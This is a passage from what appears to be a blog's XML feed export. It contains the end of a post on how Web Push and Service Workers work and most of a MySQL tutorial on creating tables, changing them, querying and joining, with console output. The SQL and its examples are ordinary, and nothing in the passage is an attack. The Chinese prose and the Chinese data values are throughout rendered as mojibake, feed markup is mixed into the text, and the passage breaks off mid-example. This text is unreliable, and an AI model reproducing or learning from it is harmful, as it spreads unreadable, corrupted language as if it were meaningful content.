åº”ç”¨æœåŠ¡å™¨è§¦å‘äº†æ¨é€æ¶ˆæ¯ç»™å“ªä¸ªç”¨æˆ·ã€‚ ä¸ŠæŠ¥ push subscription ï¼šé¡µé¢è·å–åˆ° push subscription é€šè¿‡ Ajax å°†å®ƒå‘é€ç»™ Web åº”ç”¨æœåŠ¡å™¨ã€‚ 12345678&#123; &quot;endpoint&quot;: &quot;https://random-push-service.com/some-kind-of-unique-id-1234/v2/&quot;, &quot;keys&quot;: &#123; &quot;p256dh&quot; :&quot;BNcRdreALRFXTkOOUHK1EtK2wtaz5Ry4YfYCA_0QTpQtUbVlUls0VJXg7A8u-Ts1XbjhazAkj7I99e8QcYP7DkM=&quot;, &quot;auth&quot; : &quot;tBHItJI5svbpez7KI4CCXg==&quot; &#125;&#125; æ¨é€æ¶ˆæ¯ï¼šWeb åº”ç”¨æœåŠ¡å™¨éœ€è¦æ¨é€æ¶ˆæ¯æ—¶ï¼Œå°† push message å’Œ push subscription å‘é€ç»™ push serviceï¼ˆFCMï¼‰ã€‚ é€šçŸ¥ï¼šFCM æ ¹æ® push subscription æ‰¾åˆ°å¯¹åº”çš„æµè§ˆå™¨å®¢æˆ·ç«¯å¹¶æŠŠæ¶ˆæ¯æ¨é€ç»™å®ƒï¼Œæµè§ˆå™¨å”¤é†’ç›¸åº”çš„ ServiceWorker å¹¶è§¦å‘ push äº‹ä»¶ï¼Œé€šçŸ¥ç”¨æˆ·ã€‚ å–æ¶ˆè®¢é˜…ï¼šé¡µé¢åœ¨ä¸å†éœ€è¦è®¢é˜…æ¶ˆæ¯æ—¶ï¼Œå¯ä»¥å‘é€ Ajax è¯·æ±‚é€šçŸ¥ Web åº”ç”¨æœåŠ¡å™¨å»æ¸…é™¤ push subscription å¹¶è°ƒç”¨ PushSubscription.unsubscribe å‘ push service å»å–æ¶ˆè®¢é˜…ã€‚ ä½“éªŒä¸€æŠŠæˆ‘ä»¬ä» https://github.com/uestc66/web-push-codelab ä¸Š clone ä»£ç ï¼ŒæŒ‰æ–‡æ¡£æŒ‡ç¤ºæ­¥éª¤æ“ä½œæ¨¡æ‹Ÿä¸€ä¸ª Web Push çš„åŸºæœ¬æµç¨‹ï¼š å®ç°é—¨æ§› Service Workerï¼šä¸ºäº†åšåˆ°åœ¨ç½‘é¡µå…³é—­çš„æƒ…å†µä¸‹ï¼Œè¿˜èƒ½ç»§ç»­å‘é€ Notificationï¼Œå¿…é¡»ä½¿ç”¨é©»ç•™è¿›ç¨‹ï¼Œè€Œç°åœ¨ Web é©»ç•™è¿›ç¨‹å°±æ˜¯ç°åœ¨æ­£åœ¨å¤§åŠ›æ™®åŠçš„ Service Workerï¼ˆchrome ä¸‹æ‰“å¼€ï¼š chrome://serviceworker-internals æŸ¥çœ‹ï¼‰ã€‚ æµè§ˆå™¨å¿…é¡»æ”¯æŒ Push API åŠ Notification APIã€‚ç›®å‰å¤§éƒ¨åˆ†ç”¨æˆ·æµè§ˆå™¨æ˜¯åŸºäº Chrome å†…æ ¸ï¼Œ API æ”¯æŒåº¦è¿˜ç®—å¯ä»¥ã€‚ HTTPSï¼šå‡ºäºå®‰å…¨æ–¹é¢çš„è€ƒè™‘ï¼ŒService Worker åªèƒ½è·‘åœ¨ HTTPS é¡µé¢ã€‚ç›®å‰å¤§éƒ¨åˆ†ç½‘ç«™å·²ç»æ˜¯ HTTPS çš„äº†ï¼Œè¿™ä¸ªé—®é¢˜ä¸å¤§ã€‚ æµè§ˆå™¨å®¢æˆ·ç«¯å’Œ Web åº”ç”¨æœåŠ¡å™¨éƒ½å¿…é¡»èƒ½å¤Ÿè®¿é—® Google Serviceã€‚Push Service çš„é»˜è®¤å®ç°æ˜¯ Google çš„ FCM/GCM ï¼ˆæŸ¥çœ‹ chrome://gcm-internals/ï¼‰ï¼Œè€Œç›®å‰å¤§éƒ¨åˆ†å›½å†…ç½‘ç»œç¯å¢ƒæ— æ³•è®¿é—® Chrome çš„ FCM æ¨é€æœåŠ¡ï¼Œæ‰€ä»¥åœ¨ä¸ç¿»å¢™çš„ç½‘ç»œç¯å¢ƒä¸‹æµè§ˆå™¨æ— æ³•å®Œæˆæ¶ˆæ¯è®¢é˜…å’Œæ¨é€ã€‚ æµè§ˆå™¨è‡ªå»º push service å¯¹äºæœåŠ¡å™¨çš„è½¯ç¡¬ä»¶æˆæœ¬ä¸å°ï¼Œæ¨é€æœåŠ¡å•†å€’æ˜¯å¯ä»¥è€ƒè™‘ä¸ºæµè§ˆå™¨å‚å•†æä¾›æ”¯æŒæ ‡å‡†çš„ Web Push Protocol çš„æœ‰å½±å“åŠ›çš„æ¨é€æœåŠ¡ï¼Œç±»ä¼¼ Google çš„ FCM/GCMã€‚ å¦‚æœWeb Pushä¸€ç›´å¾—ä¸åˆ°æ”¯æŒï¼Œå¯¹äºæµè§ˆå™¨SDKæ¥è¯´ï¼Œå¯ä»¥æä¾›ä¸€å¥—éæ ‡å‡†çš„APIï¼Œå…è®¸å®¢æˆ·ç«¯ï¼ˆæ¯”å¦‚ï¼Œæ‰‹æ·˜ï¼‰æ¨é€æ¶ˆæ¯ç»™æµè§ˆå™¨çš„ServiceWorkerï¼Œpush serviceåˆ™ç”±ä½¿ç”¨æµè§ˆå™¨SDKçš„å®¢æˆ·ç«¯è‡ªè¡Œå»å®ç°ã€‚ åŸºäºä¸‰æ–¹çš„æ¨é€å·¥å…·æ¥å®ç°ï¼Œå¦‚ï¼šonesignalã€‚ FAQPush &amp;&amp; Notificationå¯ä»¥ç†è§£ä¸ºå°±æ˜¯ Push Servicer å’Œ ServiceWorker ä¹‹é—´ï¼ŒServiceWorker å’Œ Web Page ä¹‹é—´çš„æ¶ˆæ¯é€šä¿¡ã€‚ Push: Push Servicer å°†æ›´æ–°çš„ä¿¡æ¯ä¼ é€’ç»™ ServiceWorker Notification: ServiceWorker å°†æ›´æ–°çš„ä¿¡æ¯æ¨é€ç»™ç”¨æˆ· å¯¹æ¯” Ajax è½®è¯¢ã€Http é•¿è¿æ¥ã€WebSocket Ajax è½®è¯¢æ˜¯é€šè¿‡å®¢æˆ·ç«¯ä¸æ–­å‘æœåŠ¡ç«¯å‘é€ Http è¯·æ±‚ï¼Œè‹¥æœ‰æ–°æ¶ˆæ¯å°±å–å›çš„æ¨¡å¼ä¿æŒæ•°æ®å®æ—¶æ›´æ–°ï¼Œä½†è¿™ç§æ–¹å¼éœ€è¦æœåŠ¡å™¨æœ‰å¾ˆå¿«çš„å¤„ç†é€Ÿåº¦å’Œèµ„æºã€‚ Http é•¿è¿æ¥æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚åï¼Œè‹¥æœåŠ¡å™¨æ²¡æœ‰æ–°æ•°æ®è¦å‘é€ï¼Œå°±ä¸è¿”å› responseï¼Œä¸€æ—¦æœ‰äº†æ–°æ•°æ®è¿”å›äº†responseï¼Œå®¢æˆ·ç«¯å°±ç«‹åˆ»å†å‘ä¸€ä¸ª requestï¼Œå‘¨è€Œå¤å§‹ã€‚äº‹å®ä¸Šè¿™æ˜¯æŠŠ http åè®®çš„ä¸å¯¹ç§°æ€§ä»å®¢æˆ·ç«¯è½¬ç§»åˆ°äº†æœåŠ¡ç«¯ã€‚ WebSocket æ˜¯ HTML5 ä¸­æå‡ºçš„ä¸€ä¸ªæ–°æ ‡å‡†ï¼Œå®¢æˆ·ç«¯åœ¨å‘é€è¯·æ±‚æ—¶åœ¨è¯·æ±‚å¤´åŠ å…¥é¢å¤–çš„å­—æ®µï¼Œä»¥æ ‡è¯†è¿™æ˜¯ä¸€ä¸ªåŸºäº WebSocket åè®®çš„è¿æ¥ï¼ŒæœåŠ¡å™¨æ ¹æ®è¿™ä¸ªè¯·æ±‚å¤´ç”Ÿæˆå“åº”ï¼Œä¸å®¢æˆ·ç«¯å»ºç«‹èµ· WebSocket è¿æ¥ï¼Œä¹‹åæœåŠ¡ç«¯æœ‰æ–°æ¶ˆæ¯æ—¶ï¼Œç›´æ¥å‘å®¢æˆ·ç«¯æ¨é€å³å¯ã€‚ ç»¼ä¸Šï¼ŒAjax è½®è¯¢ã€Http é•¿è¿æ¥ã€WebSocket éƒ½ä¾èµ–é¡µé¢ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œä¸€æ—¦é¡µé¢æˆ–è€…æµè§ˆå™¨å…³é—­ï¼Œè¿æ¥ä¹Ÿå°±å…³äº†ï¼Œè€Œ Web Push åŸºäº Service Worker å³ä½¿é¡µé¢æˆ–è€…æµè§ˆå™¨å…³é—­ï¼Œå½“æ¶ˆæ¯åˆ°è¾¾æ—¶ï¼Œä¹Ÿèƒ½è¢«å”¤é†’å¹¶æ˜¾ç¤ºæ¶ˆæ¯ã€‚ å›½å†…å“ªäº›ç«™ç‚¹å®ç°äº† Web Push AliExpressï¼ŒAlibaba.com ä½œä¸º FCM launch çš„åˆä½œä¼™ä¼´ï¼Œå®Œæˆäº† H5 æ¶ˆæ¯æ¨é€çš„è½åœ°ã€‚ https://m.aliexpress.com/ https://www.alibaba.com/ å‚è€ƒæ–‡æ¡£ google å®˜æ–¹æ–‡æ¡£ web-pushå®ç°åŸç†åŠç»†èŠ‚ä»‹ç»]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F10%2F15%2FSQL%2F%E5%AE%9E%E7%94%A8%20SQL%20%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[å®ç”¨ SQL è¯­å¥å‰è¨€æ–‡ç« æ²¿ç€è®¾è®¡ä¸€ä¸ªå‡æƒ³çš„åº”ç”¨ awesome_app ä¸ºä¸»çº¿ï¼Œä»é›¶åˆ›å»ºä¿®æ”¹æ•°æ®åº“ï¼Œè¡¨æ ¼ï¼Œå­—æ®µå±æ€§ï¼Œç´¢å¼•ï¼Œå­—ç¬¦é›†ï¼Œé»˜è®¤å€¼ï¼Œè‡ªå¢ï¼Œå¢åˆ æ”¹æŸ¥ï¼Œå¤šè¡¨æŸ¥è¯¢ï¼Œå†…ç½®å‡½æ•°ç­‰å®ç”¨ SQL è¯­å¥ã€‚æ”¶è—æ­¤æ–‡ï¼Œå‘Šåˆ«é›¶æ•£åˆä½æ•ˆåœ°æœç´¢ç»å¸¸ä½¿ç”¨çš„ SQL è¯­å¥ã€‚æ‰€æœ‰ SQL éƒ½åœ¨ MySQL ä¸‹é€šè¿‡éªŒè¯ï¼Œå¯ç•™ç€æ—¥åå›é¡¾å‚è€ƒï¼Œä¹Ÿå¯è·Ÿç€åŠ¨æ‰‹ä¸€èµ·åšï¼Œå¦‚æœæœªå®‰è£… MySQL å¯å‚è€ƒ ã€ŠmacOS å®‰è£… mysqlã€‹ (windows å®‰è£…å¤§åŒå°å¼‚)ã€‚ 1. åˆ›å»º1.1 åˆ›å»ºæ•°æ®åº“è¯­æ³•ï¼šcreate database db_name ç¤ºä¾‹ï¼šåˆ›å»ºåº”ç”¨æ•°æ®åº“ awesome_app 1create database `awesome_app` 1.2 åˆ›å»ºè¡¨æ ¼è¯­æ³•ï¼šcreate table table_name ( â€¦ columns ) ç¤ºä¾‹ï¼šåˆ›å»ºç”¨æˆ·è¡¨ users 1234567create table `users`( `id` int, `name` char(10), `avatar` varchar(300), `regtime` date) 1.3 åˆ›å»ºç´¢å¼•è¯­æ³•ï¼šcreate index index_name on table_name (column_name) ç¤ºä¾‹ï¼šä¸ºç”¨æˆ· id åˆ›å»ºç´¢å¼• idx_id 123create index `idx_id` on `users` (`id`)/* åˆ›å»ºå”¯ä¸€ç´¢å¼• */create unique index `idx_id` on `users` (`id`) 1.4 ä¸ºå·²å­˜åœ¨çš„åˆ—åˆ›å»ºä¸»é”® æ›´å¸¸ç”¨çš„æ–¹å¼æ˜¯åœ¨åˆ›å»ºè¡¨è¯­å¥æ‰€æœ‰åˆ—å®šä¹‰çš„åé¢æ·»åŠ ä¸€è¡Œ primary key (column_name)ã€‚ è¯­æ³•ï¼šalter table table_name add primary key (column_name) ç¤ºä¾‹ï¼šå°†ç”¨æˆ· id è®¾ä¸ºä¸»é”® 1alter table users add primary key (`id`) 1.5 ä¸ºå·²å­˜åœ¨çš„åˆ—åˆ›å»ºè‡ªå¢çº¦æŸ æ›´å¸¸ç”¨çš„æ–¹å¼æ˜¯åœ¨åˆ›å»ºè¡¨è¯­å¥ä¸­æ·»åŠ è‡ªå¢åˆ— id int not null auto_incrementã€‚ 1alter table `users` modify `id` int not null auto_increment 2. æ’å…¥è¯­æ³•ï¼š insert into table_name values (value1, value2, â€¦) insert into table_name (column1, column2, â€¦) values (value1, value2, â€¦) ç¤ºä¾‹ï¼šæ–°å¢æ³¨å†Œç”¨æˆ· 123insert into `users` values (1, &apos;ken&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/avatar1.jpg&apos;, curdate())/* æŒ‡å®šåˆ—æ’å…¥ */insert into `users` (`name`, `avatar`) values (&apos;bill&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg&apos;) 3. ä¿®æ”¹3.1 ä¿®æ”¹æ•°æ®è®°å½•è¯­æ³•ï¼š update table_name set column=new_value where condition update table_name set column1=new_value1,column2=new_value2,â€¦ where condition ç¤ºä¾‹ï¼š 123update `users` set `regtime`=curdate() where `regtime` is null/* ä¸€æ¬¡ä¿®æ”¹å¤šåˆ— */update `users` set `name`=&apos;steven&apos;,`avatar`=&apos;http://cdn.awesome_app.com/path/to/xxx/steven.jpg&apos; where `id`=1 3.2 ä¿®æ”¹æ•°æ®åº“å­—ç¬¦é›†ä¸º utf81alter database `awesome_app` default character set utf8 3.3 ä¿®æ”¹è¡¨å­—ç¬¦é›†ä¸º utf81alter table `users` convert to character set utf8 3.4 ä¿®æ”¹è¡¨å­—æ®µå­—ç¬¦é›†ä¸º utf81alter table `users` modify `name` char(10) character set utf8 3.5 ä¿®æ”¹å­—æ®µç±»å‹1alter table `users` modify `regtime` datetime not null 3.5 ä¿®æ”¹å­—æ®µé»˜è®¤å€¼123alter table `users` alter `regtime` set default &apos;2019-10-12 00:00:00&apos;/* è®¾ç½®é»˜è®¤ä¸ºå½“å‰æ—¶é—´ current_timestampï¼Œéœ€è¦é‡æ–°å®šä¹‰æ•´ä¸ªåˆ— */alter table `users` modify `regtime` datetime not null default current_timestamp 4. åˆ é™¤4.1 åˆ é™¤æ•°æ®è®°å½•è¯­æ³•ï¼šdelete from table_name where condition ç¤ºä¾‹ï¼šåˆ é™¤ç”¨æˆ·åæœªå¡«å†™çš„ç”¨æˆ· 12345678910111213141516171819# å…ˆå¢åŠ ä¸€æ¡ç”¨æˆ·åä¸ºç©ºçš„ç”¨æˆ·mysql&gt; insert into `users` (`regtime`) values (curdate());mysql&gt; select * from users;+----+--------+----------------------------------------------------+------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 || 3 | NULL | NULL | 2019-10-12 |+----+--------+----------------------------------------------------+------------+# åˆ é™¤ç”¨æˆ·åä¸ºç©ºçš„è¡Œmysql&gt; delete from `users` where `name` is null;mysql&gt; select * from users;+----+--------+----------------------------------------------------+------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 |+----+--------+----------------------------------------------------+------------+ 4.2 åˆ é™¤æ•°æ®åº“1drop database if exists `awesome_app` 4.3 åˆ é™¤è¡¨1drop table if exists `users` 4.4 æ¸…ç©ºè¡¨ä¸­æ‰€æœ‰æ•°æ®è¿™ä¸ªæ“ä½œç›¸å½“äºå…ˆ drop table å† create table ï¼Œå› æ­¤éœ€è¦æœ‰ drop æƒé™ã€‚ 1truncate table `users` 4.5 åˆ é™¤ç´¢å¼•1drop index `idx_id` on `users` 5. æŸ¥è¯¢5.1 è¯­æ³•1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &apos;file_name&apos; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 5.2 å•è¡¨æŸ¥è¯¢5.2.1 å‡†å¤‡æ•°æ®ï¼š123456789101112131415insert into users (`name`, `avatar`) values(&apos;å¼ ä¸‰&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/3.jpg&apos;),(&apos;æå››&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/4.jpg&apos;),(&apos;ç‹äº”&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/5.jpg&apos;),(&apos;é©¬å…­&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/6.jpg&apos;),(&apos;è‚–ä¸ƒ&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/7.jpg&apos;),(&apos;åˆ˜å…«&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/8.jpg&apos;),(&apos;æ¨ä¹&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/9.jpg&apos;),(&apos;éƒ‘å&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/10.jpg&apos;);/* å¢åŠ é‡å¤è¡Œ */insert into users (`name`, `avatar`) values(&apos;å¼ ä¸‰&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/3.jpg&apos;),(&apos;æå››&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/4.jpg&apos;),(&apos;ç‹äº”&apos;, &apos;http://cdn.awesome_app.com/path/to/xxx/5.jpg&apos;); 5.2.2 æŸ¥è¯¢æ‰€æœ‰åˆ—123456789101112131415161718mysql&gt; select * from users;+----+--------+----------------------------------------------------+---------------------+| id | name | avatar | regtime |+----+--------+----------------------------------------------------+---------------------+| 1 | steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg | 2019-10-12 00:00:00 || 2 | bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg | 2019-10-12 00:00:00 || 3 | å¼ ä¸‰ | http://cdn.awesome_app.com/path/to/xxx/3.jpg | 2019-10-13 10:58:37 || 4 | æå›› | http://cdn.awesome_app.com/path/to/xxx/4.jpg | 2019-10-13 10:58:37 || 5 | ç‹äº” | http://cdn.awesome_app.com/path/to/xxx/5.jpg | 2019-10-13 10:58:37 || 6 | é©¬å…­ | http://cdn.awesome_app.com/path/to/xxx/6.jpg | 2019-10-13 10:58:37 || 7 | è‚–ä¸ƒ | http://cdn.awesome_app.com/path/to/xxx/7.jpg | 2019-10-13 10:58:37 || 8 | åˆ˜å…« | http://cdn.awesome_app.com/path/to/xxx/8.jpg | 2019-10-13 10:58:37 || 9 | æ¨ä¹ | http://cdn.awesome_app.com/path/to/xxx/9.jpg | 2019-10-13 10:58:37 || 10 | éƒ‘å | http://cdn.awesome_app.com/path/to/xxx/10.jpg | 2019-10-13 10:58:37 || 11 | å¼ ä¸‰ | http://cdn.awesome_app.com/path/to/xxx/3.jpg | 2019-10-13 11:20:17 || 12 | æå›› | http://cdn.awesome_app.com/path/to/xxx/4.jpg | 2019-10-13 11:20:17 || 13 | ç‹äº” | http://cdn.awesome_app.com/path/to/xxx/5.jpg | 2019-10-13 11:20:17 |+----+--------+----------------------------------------------------+---------------------+ 5.2.3 æŸ¥è¯¢æŒ‡å®šåˆ—123456789101112131415161718mysql&gt; select id,name from users;+----+--------+| id | name |+----+--------+| 1 | steven || 2 | bill || 3 | å¼ ä¸‰ || 4 | æå›› || 5 | ç‹äº” || 6 | é©¬å…­ || 7 | è‚–ä¸ƒ || 8 | åˆ˜å…« || 9 | æ¨ä¹ || 10 | éƒ‘å || 11 | å¼ ä¸‰ || 12 | æå›› || 13 | ç‹äº” |+----+--------+ 5.2.4 æŸ¥è¯¢ä¸é‡å¤è®°å½•123456789101112131415mysql&gt; select distinct name,avatar from users;+--------+----------------------------------------------------+| name | avatar |+--------+----------------------------------------------------+| steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg || bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg || å¼ ä¸‰ | http://cdn.awesome_app.com/path/to/xxx/3.jpg || æå›› | http://cdn.awesome_app.com/path/to/xxx/4.jpg || ç‹äº” | http://cdn.awesome_app.com/path/to/xxx/5.jpg || é©¬å…­ | http://cdn.awesome_app.com/path/to/xxx/6.jpg || è‚–ä¸ƒ | http://cdn.awesome_app.com/path/to/xxx/7.jpg || åˆ˜å…« | http://cdn.awesome_app.com/path/to/xxx/8.jpg || æ¨ä¹ | http://cdn.awesome_app.com/path/to/xxx/9.jpg || éƒ‘å | http://cdn.awesome_app.com/path/to/xxx/10.jpg |+--------+----------------------------------------------------+ 5.2.5 é™åˆ¶æŸ¥è¯¢è¡Œæ•°æŸ¥è¯¢å‰å‡ è¡Œ 1234567mysql&gt; select id,name from users limit 2;+----+--------+| id | name |+----+--------+| 1 | steven || 2 | bill |+----+--------+ æŸ¥è¯¢ä»æŒ‡å®šåç§»(ç¬¬ä¸€è¡Œä¸ºåç§»ä¸º0)å¼€å§‹çš„å‡ è¡Œ 12345678mysql&gt; select id,name from users limit 2,3;+----+--------+| id | name |+----+--------+| 3 | å¼ ä¸‰ || 4 | æå›› || 5 | ç‹äº” |+----+--------+ 5.2.6 æ’åº123456789101112131415161718# æ­£åºmysql&gt; select distinct name from users order by name asc limit 3;+--------+| name |+--------+| bill || steven || åˆ˜å…« |+--------+# å€’åºmysql&gt; select id,name from users order by id desc limit 3;+----+--------+| id | name |+----+--------+| 13 | ç‹äº” || 12 | æå›› || 11 | å¼ ä¸‰ |+----+--------+ 5.2.7 åˆ†ç»„å¢åŠ åŸå¸‚å­—æ®µ 1234567alter table `users` add `city` varchar(10) comment &apos;ç”¨æˆ·æ‰€åœ¨åŸå¸‚&apos; after `name`;update `users` set `city`=&apos;æ—§é‡‘å±±&apos; where `id`=1;update `users` set `city`=&apos;è¥¿é›…å›¾&apos; where `id`=2;update `users` set `city`=&apos;åŒ—äº¬&apos; where `id` in (3,5,7);update `users` set `city`=&apos;ä¸Šæµ·&apos; where `id` in (4,6,8);update `users` set `city`=&apos;å¹¿å·&apos; where `id` between 9 and 10;update `users` set `city`=&apos;æ·±åœ³&apos; where `id` between 11 and 13; æŒ‰åŸå¸‚åˆ†ç»„ç»Ÿè®¡ç”¨æˆ·æ•° 1234567891011121314151617181920212223242526mysql&gt; select city, count(name) as num_of_user from users group by city;+-----------+-------------+| city | num_of_user |+-----------+-------------+| ä¸Šæµ· | 3 || åŒ—äº¬ | 3 || å¹¿å· | 2 || æ—§é‡‘å±± | 1 || æ·±åœ³ | 3 || è¥¿é›…å›¾ | 1 |+-----------+-------------+mysql&gt; select city, count(name) as num_of_user from users group by city having num_of_user=1;+-----------+-------------+| city | num_of_user |+-----------+-------------+| æ—§é‡‘å±± | 1 || è¥¿é›…å›¾ | 1 |+-----------+-------------+mysql&gt; select city, count(name) as num_of_user from users group by city having num_of_user&gt;2;+--------+-------------+| city | num_of_user |+--------+-------------+| ä¸Šæµ· | 3 || åŒ—äº¬ | 3 || æ·±åœ³ | 3 |+--------+-------------+ 5.3 å¤šè¡¨å…³è”æŸ¥è¯¢5.3.1 å‡†å¤‡æ•°æ®1234567891011121314151617181920create table if not exists `orders`( `id` int not null primary key auto_increment comment &apos;è®¢å•ID&apos;, `title` varchar(50) not null comment &apos;è®¢å•æ ‡é¢˜&apos;, `user_id` int not null comment &apos;ç”¨æˆ·ID&apos;, `cretime` timestamp not null default current_timestamp comment &apos;åˆ›å»ºæ—¶é—´&apos;);create table if not exists `groups`( `id` int not null primary key auto_increment comment &apos;ç”¨æˆ·ç»„ID&apos;, `title` varchar(50) not null comment &apos;ç”¨æˆ·ç»„æ ‡é¢˜&apos;, `cretime` timestamp not null default current_timestamp comment &apos;åˆ›å»ºæ—¶é—´&apos;);alter table `users` add `group_id` int comment &apos;ç”¨æˆ·åˆ†ç»„&apos; after `city`;insert into `groups` (`title`) values (&apos;å¤§ä½¬&apos;), (&apos;èŒæ–°&apos;), (&apos;èœé¸¡&apos;);insert into `orders` (`title`, `user_id`) values (&apos;ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹&apos;, 3), (&apos;ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹&apos;, 6), (&apos;ã€Šèœé¸¡è¸©å‘è®°ã€‹&apos;, 9);update `users` set `group_id`=1 where `id` between 1 and 2;update `users` set `group_id`=2 where `id` in (4, 6, 8, 10, 12);update `users` set `group_id`=3 where `id` in (3, 5, 13); 5.3.2 joinjoin ç”¨äºåœ¨å¤šä¸ªè¡¨ä¸­æŸ¥è¯¢ç›¸äº’åŒ¹é…çš„æ•°æ®ã€‚ 12345678mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users`, `orders` where `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| å¼ ä¸‰ | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || é©¬å…­ | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || æ¨ä¹ | ã€Šèœé¸¡è¸©å‘è®°ã€‹ |+-----------+--------------------------------------+ inner join å†…éƒ¨è¿æ¥ã€‚æ•ˆæœä¸ join ä¸€æ · , ä½†ç”¨æ³•ä¸åŒï¼Œjoin ä½¿ç”¨ where ï¼Œinner join ä½¿ç”¨ on ã€‚ 12345678mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users` inner join `orders` on `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| å¼ ä¸‰ | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || é©¬å…­ | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || æ¨ä¹ | ã€Šèœé¸¡è¸©å‘è®°ã€‹ |+-----------+--------------------------------------+ left join å·¦è¿æ¥ã€‚è¿”å›å·¦è¡¨æ‰€æœ‰è¡Œï¼Œå³ä½¿å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œä¸åŒ¹é…çš„ç”¨ NULL å¡«å……ã€‚ 123456789101112131415161718mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users` left join `orders` on `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| å¼ ä¸‰ | ã€Šå¤§ä½¬æ˜¯æ€æ ·ç‚¼æˆçš„ï¼Ÿã€‹ || é©¬å…­ | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || æ¨ä¹ | ã€Šèœé¸¡è¸©å‘è®°ã€‹ || steven | NULL || bill | NULL || æå›› | NULL || ç‹äº” | NULL || è‚–ä¸ƒ | NULL || åˆ˜å…« | NULL || éƒ‘å | NULL || å¼ ä¸‰ | NULL || æå›› | NULL || ç‹äº” | NULL |+-----------+--------------------------------------+ right join å³è¿æ¥ã€‚å’Œ left join æ­£å¥½ç›¸åï¼Œä¼šè¿”å›å³è¡¨æ‰€æœ‰è¡Œï¼Œå³ä½¿å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œä¸åŒ¹é…çš„ç”¨ NULL å¡«å……ã€‚ 123456789101112131415161718mysql&gt; select `groups`.`title` as `group_title`, `users`.`name` as `user_name` from `groups` right join `users` on `users`.`group_id`=`groups`.`id`;+-------------+-----------+| group_title | user_name |+-------------+-----------+| å¤§ä½¬ | steven || å¤§ä½¬ | bill || èŒæ–° | æå›› || èŒæ–° | é©¬å…­ || èŒæ–° | åˆ˜å…« || èŒæ–° | éƒ‘å || èŒæ–° | æå›› || èœé¸¡ | å¼ ä¸‰ || èœé¸¡ | ç‹äº” || èœé¸¡ | ç‹äº” || NULL | è‚–ä¸ƒ || NULL | æ¨ä¹ || NULL | å¼ ä¸‰ |+-------------+-----------+ 5.3.3 unionunion ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢ç»“æœï¼Œåˆå¹¶çš„æŸ¥è¯¢ç»“æœå¿…é¡»å…·æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œå¹¶ä¸”åˆ—æ‹¥æœ‰å½¢ä¼¼çš„æ•°æ®ç±»å‹ï¼ŒåŒæ—¶åˆ—çš„é¡ºåºç›¸åŒã€‚ 1234567891011mysql&gt; (select `id`, `title` from `groups`) union (select `id`, `title` from `orders`);+----+--------------------------------------+| id | title |+----+--------------------------------------+| 1 | å¤§ä½¬ || 2 | èŒæ–° || 3 | èœé¸¡ || 1 | ã€Šå¤§ä½¬æ˜¯æ€æ 